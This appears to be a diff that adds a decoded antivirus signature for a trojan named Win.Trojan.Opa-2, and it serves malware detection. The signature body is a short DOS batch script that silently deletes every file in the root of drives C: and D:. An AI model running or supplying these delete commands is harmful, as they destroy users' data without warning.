@@ -1,0 +1,11 @@
+VIRUS NAME: Win.Trojan.Opa-2
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+echo off
+echo y|del c:\*.*>nul
+if exist d:\ echo y|del d:\*.*>nul
+cls
+exit>nul
+rem JOPA 1.0
+
